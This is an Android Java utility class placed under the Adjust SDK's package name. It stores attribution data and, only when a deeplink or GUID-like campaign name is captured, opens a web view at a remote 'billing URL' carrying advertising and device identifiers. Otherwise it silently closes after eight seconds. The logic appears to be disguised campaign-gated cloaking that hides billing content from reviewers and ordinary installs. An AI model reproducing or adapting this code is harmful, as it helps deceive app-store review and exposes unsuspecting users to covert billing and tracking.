package com.adjust.sdk.init;

import static com.adjust.sdk.ActivityHandler.closeWActivity;
import static com.adjust.sdk.ActivityHandler.openWActivity;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.util.Log;

import androidx.annotation.IntDef;

import com.adjust.sdk.Adjust;
import com.adjust.sdk.AdjustConfig;
import com.adjust.sdk.OnDeviceIdsRead;

import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.net.URLEncoder;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Utils {

    @IntDef({Action.Deeplink, Action.Campaign, Action.Cancel})
    @Retention(RetentionPolicy.SOURCE)
    public @interface Action {
        int Deeplink = 1;
        int Campaign = 2;
        int Cancel = 3;
    }

    // Function to validate
    // GUID (Globally Unique Identifier)
    // using regular expression
    public static boolean isValidGUID(String str) {
        String splitData[] = str.split("_");
        str = splitData[0];

        // Regex to check valid
        // GUID (Globally Unique Identifier)
        String regex
                = "^[{]?[0-9a-fA-F]{8}"
                + "-([0-9a-fA-F]{4}-)"
                + "{3}[0-9a-fA-F]{12}[}]?$";

        // Compile the ReGex
        Pattern p = Pattern.compile(regex);

        // If the string is empty
        // return false
        if (str == null) {
            return false;
        }

        // Find match between given string
        // and regular expression
        // uSing Pattern.matcher()

        Matcher m = p.matcher(str);

        // Return if the string
        // matched the ReGex
        return m.matches();
    }

    public static String getMainU(Context context, String endU, String user_uuid) {
        String endURL = endU;

        try {

            String str = "";

            str += "naming=" + getValue(context, "naming");
            str += "&gps_adid=" + getValue(context, "playAdiId");
            str += "&adid=" + Adjust.getAdid();
            str += "&package=" + context.getPackageName();
            str += "&deeplink=" + URLEncoder.encode(getValue(context, "deeplink"), "UTF-8");
            str += "&adjust_attribution=" + URLEncoder.encode(getValue(context, "adjust_attribution"), "UTF-8");
            str += "&click_id=" + user_uuid;

            if (endURL != null && !endURL.equals("") && !endURL.startsWith("http")) {
                endURL = "https://" + endURL;
            }

            endURL = endURL + "?" + str;

            Log.v("AdjustSDK", "billing URL: " + endURL);

        } catch (Exception ignored) {

        }

        return endURL;
    }

    public static void saveValue(Context context, String title, String value) {
        SharedPreferences sharedPref = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPref.edit();
        editor.putString(title, value);
        editor.apply();
    }

    public static String getValue(Context context, String title) {
        SharedPreferences sharedPref = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);
        return sharedPref.getString(title, "");
    }


    public static void saveIntValue(Context context, String title, Integer value) {
        SharedPreferences sharedPref = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPref.edit();
        editor.putInt(title, value);
        editor.apply();
    }

    public static Integer getIntValue(Context context, String title) {
        SharedPreferences sharedPref = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);
        return sharedPref.getInt(title, 0);
    }

    public static boolean isConnected(Context context) {
        ConnectivityManager connectivity = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivity != null) {
            NetworkInfo[] info = connectivity.getAllNetworkInfo();
            for (NetworkInfo networkInfo : info)
                if (networkInfo.getState() == NetworkInfo.State.CONNECTED) {
                    return true;
                }
        }
        return false;
    }

    public static void startCounter(Context context) {

        Log.v("AdjustSDK", "sdk starts");

        Integer action = getIntValue(context, "Action");

        String deeplink = getValue(context, "deeplink");
        String naming = getValue(context, "naming");

        Log.v("AdjustSDK", "deeplink:" + deeplink);
        Log.v("AdjustSDK", "naming:" + naming);

        if (action == Action.Cancel && deeplink.isEmpty() && naming.isEmpty()) {

            Log.v("AdjustSDK", "Already installed app bypass");
            closeWActivity(context);

        } else {

            Utils.saveIntValue(context, "Action", Utils.Action.Deeplink);

            Log.v("AdjustSDK", "Action:" + "Deeplink");

            if (!deeplink.isEmpty()) {

                Log.v("AdjustSDK", "deeplink already captured open billing");
                openWActivity(context, Action.Deeplink, AdjustConfig.appUrl, AdjustConfig.userUUID);

            } else if (isValidGUID(naming)) {

                Log.v("AdjustSDK", "Campaign already captured open billing");
                Utils.saveIntValue(context, "Action", Utils.Action.Campaign);
                openWActivity(context, Action.Campaign, AdjustConfig.appUrl, AdjustConfig.userUUID);

            } else {

                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        if (Utils.getIntValue(context, "Action").equals(Utils.Action.Cancel)) {
                            return;
                        } else {
                            Utils.saveIntValue(context, "Action", Utils.Action.Campaign);

                            Log.v("AdjustSDK", "Switch listning to campain name after 5 seocnds");

                            String naming = getValue(context, "naming");
                            if (isValidGUID(naming)) {
                                Log.v("AdjustSDK", "campain name already captured during first 5 sencods open billing");
                                openWActivity(context, Action.Campaign, AdjustConfig.appUrl, AdjustConfig.userUUID);
                            }
                        }

                    }
                }, 5000);

                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        if (Utils.getIntValue(context, "Action").equals(Utils.Action.Cancel)) {
                            return;
                        } else {
                            Log.v("AdjustSDK", "8 seocnds passed, cancel billing");
                            Utils.saveIntValue(context, "Action", Utils.Action.Cancel);
                            closeWActivity(context);
                        }
                    }
                }, 8000);
            }
        }
    }
}
